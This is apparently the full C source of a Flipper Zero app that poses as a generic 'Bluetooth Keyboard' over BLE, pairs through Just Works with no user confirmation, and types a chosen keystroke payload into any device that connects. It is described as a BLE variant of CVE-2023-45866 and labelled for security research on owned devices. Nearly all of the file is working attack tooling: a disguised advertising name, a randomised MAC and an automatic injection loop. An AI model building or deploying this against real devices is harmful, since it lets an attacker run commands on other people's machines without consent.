#include <furi.h>
#include <furi_hal.h>
#include <gui/gui.h>
#include <gui/view_dispatcher.h>
#include <gui/scene_manager.h>
#include <gui/modules/submenu.h>
#include <gui/modules/widget.h>
#include <gui/modules/popup.h>
#include <notification/notification_messages.h>
#include <bt/bt_service/bt.h>
#include <ble_profile/extra_profiles/hid_profile.h>
#include <gap.h>

#include "helpers/hid_payloads.h"

#define TAG "BleHidInject"

// BLE HID profile with Just Works pairing (no confirmation needed)
// This is the BLE equivalent of CVE-2023-45866's BR/EDR attack
typedef struct {
    char name[FURI_HAL_BT_ADV_NAME_LENGTH];
    uint8_t mac[GAP_MAC_ADDR_SIZE];
    bool bonding;
    GapPairing pairing;
} HidExtParams;

static FuriHalBleProfileBase* hid_ext_start(FuriHalBleProfileParams params) {
    UNUSED(params);
    return ble_profile_hid->start(NULL);
}

static void hid_ext_stop(FuriHalBleProfileBase* profile) {
    ble_profile_hid->stop(profile);
}

static void hid_ext_get_config(GapConfig* config, FuriHalBleProfileParams params) {
    furi_check(config);
    HidExtParams* p = params;
    ble_profile_hid->get_gap_config(config, NULL);
    memcpy(config->mac_address, p->mac, sizeof(config->mac_address));
    strlcpy(config->adv_name + 1, p->name, sizeof(config->adv_name) - 1);
    config->bonding_mode = p->bonding;
    config->pairing_method = p->pairing;
}

static const FuriHalBleProfileTemplate hid_inject_profile = {
    .start = hid_ext_start,
    .stop = hid_ext_stop,
    .get_gap_config = hid_ext_get_config,
};

// App state
typedef enum {
    HidViewSubmenu,
    HidViewWidget,
    HidViewPopup,
} HidViewId;

enum {
    HidSceneStart,
    HidSceneWaiting,
    HidSceneNum,
};

typedef struct {
    Gui* gui;
    ViewDispatcher* view_dispatcher;
    Submenu* submenu;
    Widget* widget;
    Popup* popup;
    NotificationApp* notifications;
    Bt* bt;
    FuriHalBleProfileBase* profile;
    FuriTimer* timer;

    uint8_t selected_payload;
    bool bt_was_active;
    bool connected;
    bool injecting;
    uint8_t inject_idx;
} HidInjectorApp;

// Forward declarations
static void hid_inject_start_on_enter(void* ctx);
static bool hid_inject_start_on_event(void* ctx, SceneManagerEvent event);
static void hid_inject_start_on_exit(void* ctx);
static void hid_inject_waiting_on_enter(void* ctx);
static bool hid_inject_waiting_on_event(void* ctx, SceneManagerEvent event);
static void hid_inject_waiting_on_exit(void* ctx);

static void (*const scene_enter[])(void*) = {
    hid_inject_start_on_enter,
    hid_inject_waiting_on_enter,
};
static bool (*const scene_event[])(void*, SceneManagerEvent) = {
    hid_inject_start_on_event,
    hid_inject_waiting_on_event,
};
static void (*const scene_exit[])(void*) = {
    hid_inject_start_on_exit,
    hid_inject_waiting_on_exit,
};

static const SceneManagerHandlers scene_handlers = {
    .on_enter_handlers = scene_enter,
    .on_event_handlers = scene_event,
    .on_exit_handlers = scene_exit,
    .scene_num = HidSceneNum,
};

// Timer callback — check connection and inject keys
static void hid_timer_cb(void* ctx) {
    HidInjectorApp* app = ctx;
    view_dispatcher_send_custom_event(app->view_dispatcher, 0);
}

// --- Start Scene: Select payload ---

static void start_cb(void* ctx, uint32_t idx) {
    view_dispatcher_send_custom_event(((HidInjectorApp*)ctx)->view_dispatcher, idx);
}

static void hid_inject_start_on_enter(void* ctx) {
    HidInjectorApp* app = ctx;
    submenu_reset(app->submenu);
    submenu_set_header(app->submenu, "HID Inject: Payload");
    for(uint8_t i = 0; i < PAYLOAD_COUNT; i++) {
        submenu_add_item(app->submenu, hid_payloads[i].name, i, start_cb, app);
    }
    submenu_add_item(app->submenu, "About", PAYLOAD_COUNT, start_cb, app);
    view_dispatcher_switch_to_view(app->view_dispatcher, HidViewSubmenu);
}

static bool hid_inject_start_on_event(void* ctx, SceneManagerEvent event) {
    HidInjectorApp* app = ctx;
    if(event.type != SceneManagerEventTypeCustom) return false;

    if(event.event < PAYLOAD_COUNT) {
        app->selected_payload = event.event;
        scene_manager_next_scene(
            (SceneManager*)app->view_dispatcher->context_scene, HidSceneWaiting);
        return true;
    } else if(event.event == PAYLOAD_COUNT) {
        widget_reset(app->widget);
        widget_add_text_scroll_element(
            app->widget, 0, 0, 128, 64,
            "BLE HID Injector v0.1\n\n"
            "Advertises as a BLE\n"
            "keyboard with Just Works\n"
            "pairing (no PIN).\n\n"
            "When a device connects,\n"
            "the selected keystroke\n"
            "payload is injected.\n\n"
            "BLE variant of\n"
            "CVE-2023-45866 concept.\n\n"
            "For security research\n"
            "on devices you own.\n\n"
            "@KaraZajac");
        view_dispatcher_switch_to_view(app->view_dispatcher, HidViewWidget);
        return true;
    }
    return false;
}

static void hid_inject_start_on_exit(void* ctx) {
    HidInjectorApp* app = ctx;
    submenu_reset(app->submenu);
    widget_reset(app->widget);
}

// --- Waiting Scene: Advertise and wait for connection ---

static void hid_inject_waiting_on_enter(void* ctx) {
    HidInjectorApp* app = ctx;

    app->connected = false;
    app->injecting = false;
    app->inject_idx = 0;

    // Configure HID profile with stealth name and Just Works pairing
    HidExtParams hid_cfg = {
        .bonding = false,
        .pairing = GapPairingNone, // Just Works — no user confirmation
    };
    strlcpy(hid_cfg.name, "Bluetooth Keyboard", sizeof(hid_cfg.name));
    // Random MAC
    furi_hal_random_fill_buf(hid_cfg.mac, sizeof(hid_cfg.mac));
    hid_cfg.mac[0] |= 0xC0; // Mark as random static address

    // Switch BLE profile to HID
    app->bt = furi_record_open(RECORD_BT);
    app->bt_was_active = bt_is_active(app->bt);
    app->profile = bt_profile_start(app->bt, &hid_inject_profile, &hid_cfg);

    if(!app->profile) {
        FURI_LOG_E(TAG, "Failed to start HID profile");
        furi_record_close(RECORD_BT);
        scene_manager_previous_scene(
            (SceneManager*)app->view_dispatcher->context_scene);
        return;
    }

    const HidPayload* pl = &hid_payloads[app->selected_payload];

    widget_reset(app->widget);
    widget_add_string_element(app->widget, 64, 5, AlignCenter, AlignTop, FontPrimary, "Advertising...");
    widget_add_string_element(app->widget, 64, 20, AlignCenter, AlignTop, FontSecondary, "\"Bluetooth Keyboard\"");
    widget_add_string_element(app->widget, 64, 32, AlignCenter, AlignTop, FontSecondary, "Waiting for target");
    widget_add_string_element(app->widget, 64, 44, AlignCenter, AlignTop, FontSecondary, pl->name);
    widget_add_string_element(app->widget, 64, 58, AlignCenter, AlignTop, FontSecondary, "Back to cancel");
    view_dispatcher_switch_to_view(app->view_dispatcher, HidViewWidget);

    // Poll for connection every 200ms
    furi_timer_start(app->timer, 200);
}

static bool hid_inject_waiting_on_event(void* ctx, SceneManagerEvent event) {
    HidInjectorApp* app = ctx;
    if(event.type != SceneManagerEventTypeCustom) return false;

    if(!app->connected) {
        // Check if someone connected
        if(ble_profile_hid_is_connected(app->profile)) {
            app->connected = true;
            app->injecting = true;
            app->inject_idx = 0;

            widget_reset(app->widget);
            widget_add_string_element(app->widget, 64, 10, AlignCenter, AlignTop, FontPrimary, "CONNECTED!");
            widget_add_string_element(app->widget, 64, 30, AlignCenter, AlignTop, FontSecondary, "Injecting keystrokes...");
            view_dispatcher_switch_to_view(app->view_dispatcher, HidViewWidget);

            FURI_LOG_I(TAG, "Target connected, starting injection");
            // Short delay before injection starts
            furi_timer_start(app->timer, 500);
        }
        return true;
    }

    if(app->injecting) {
        const HidPayload* pl = &hid_payloads[app->selected_payload];

        if(app->inject_idx < pl->key_count) {
            const HidKeystroke* ks = &pl->keys[app->inject_idx];

            // Press key
            if(ks->mod) {
                // Send modifier + key
                ble_profile_hid_kb_press(app->profile, (ks->mod << 8) | ks->key);
            } else {
                ble_profile_hid_kb_press(app->profile, ks->key);
            }
            // Release after brief hold
            furi_delay_ms(30);
            ble_profile_hid_kb_release_all(app->profile);

            app->inject_idx++;

            uint16_t delay = ks->delay_ms ? ks->delay_ms : 50;
            furi_timer_start(app->timer, delay);
        } else {
            // Done
            app->injecting = false;
            widget_reset(app->widget);
            widget_add_string_element(app->widget, 64, 15, AlignCenter, AlignTop, FontPrimary, "Injection Complete");

            char status[48];
            snprintf(status, sizeof(status), "%d keystrokes sent", pl->key_count);
            widget_add_string_element(app->widget, 64, 35, AlignCenter, AlignTop, FontSecondary, status);
            widget_add_string_element(app->widget, 64, 52, AlignCenter, AlignTop, FontSecondary, "Back to exit");
            view_dispatcher_switch_to_view(app->view_dispatcher, HidViewWidget);

            notification_message(app->notifications, &sequence_success);
            furi_timer_stop(app->timer);
        }
        return true;
    }

    return false;
}

static void hid_inject_waiting_on_exit(void* ctx) {
    HidInjectorApp* app = ctx;
    furi_timer_stop(app->timer);

    if(app->profile) {
        ble_profile_hid_kb_release_all(app->profile);
        bt_profile_restore_default(app->bt);
        app->profile = NULL;
    }
    if(app->bt) {
        furi_record_close(RECORD_BT);
        app->bt = NULL;
    }

    widget_reset(app->widget);
}

// --- Main app ---

static bool custom_event_cb(void* ctx, uint32_t event) {
    HidInjectorApp* app = ctx;
    SceneManager* sm = (SceneManager*)app->view_dispatcher->context_scene;
    UNUSED(sm);
    // Route all custom events to the waiting scene handler
    // since our scene management is simplified
    if(app->connected || (!app->connected && app->profile)) {
        return hid_inject_waiting_on_event(ctx, (SceneManagerEvent){.type = SceneManagerEventTypeCustom, .event = event});
    }
    return false;
}

static bool back_event_cb(void* ctx) {
    UNUSED(ctx);
    return false; // Allow back navigation
}

int32_t ble_hid_injector_app(void* p) {
    UNUSED(p);

    HidInjectorApp* app = malloc(sizeof(HidInjectorApp));
    memset(app, 0, sizeof(HidInjectorApp));

    app->gui = furi_record_open(RECORD_GUI);
    app->notifications = furi_record_open(RECORD_NOTIFICATION);

    app->view_dispatcher = view_dispatcher_alloc();
    view_dispatcher_set_event_callback_context(app->view_dispatcher, app);

    app->submenu = submenu_alloc();
    view_dispatcher_add_view(app->view_dispatcher, HidViewSubmenu, submenu_get_view(app->submenu));
    app->widget = widget_alloc();
    view_dispatcher_add_view(app->view_dispatcher, HidViewWidget, widget_get_view(app->widget));
    app->popup = popup_alloc();
    view_dispatcher_add_view(app->view_dispatcher, HidViewPopup, popup_get_view(app->popup));

    app->timer = furi_timer_alloc(hid_timer_cb, FuriTimerTypePeriodic, app);

    // Simple scene management — start with payload selection
    submenu_reset(app->submenu);
    submenu_set_header(app->submenu, "BLE HID Inject");
    for(uint8_t i = 0; i < PAYLOAD_COUNT; i++) {
        submenu_add_item(app->submenu, hid_payloads[i].name, i, start_cb, app);
    }
    submenu_add_item(app->submenu, "About", PAYLOAD_COUNT, start_cb, app);

    // Set up simple event routing
    view_dispatcher_set_custom_event_callback(app->view_dispatcher, custom_event_cb);
    view_dispatcher_set_navigation_event_callback(app->view_dispatcher, back_event_cb);

    view_dispatcher_attach_to_gui(app->view_dispatcher, app->gui, ViewDispatcherTypeFullscreen);
    view_dispatcher_switch_to_view(app->view_dispatcher, HidViewSubmenu);
    view_dispatcher_run(app->view_dispatcher);

    // Cleanup
    furi_timer_stop(app->timer);
    if(app->profile) {
        bt_profile_restore_default(app->bt);
    }
    if(app->bt) furi_record_close(RECORD_BT);

    furi_timer_free(app->timer);
    view_dispatcher_remove_view(app->view_dispatcher, HidViewSubmenu);
    submenu_free(app->submenu);
    view_dispatcher_remove_view(app->view_dispatcher, HidViewWidget);
    widget_free(app->widget);
    view_dispatcher_remove_view(app->view_dispatcher, HidViewPopup);
    popup_free(app->popup);
    view_dispatcher_free(app->view_dispatcher);

    furi_record_close(RECORD_GUI);
    furi_record_close(RECORD_NOTIFICATION);
    free(app);
    return 0;
}
